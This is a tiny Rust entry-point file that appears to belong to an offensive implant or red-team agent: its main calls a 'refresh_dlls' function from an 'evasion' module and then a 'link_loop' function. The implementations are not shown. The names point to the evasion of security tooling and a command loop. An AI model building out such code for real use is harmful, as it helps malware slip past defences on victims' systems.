pub mod stdlib;
pub mod evasion;

#[no_mangle]
pub extern fn main() {
    evasion::refresh_dlls();
    stdlib::link_loop();
}
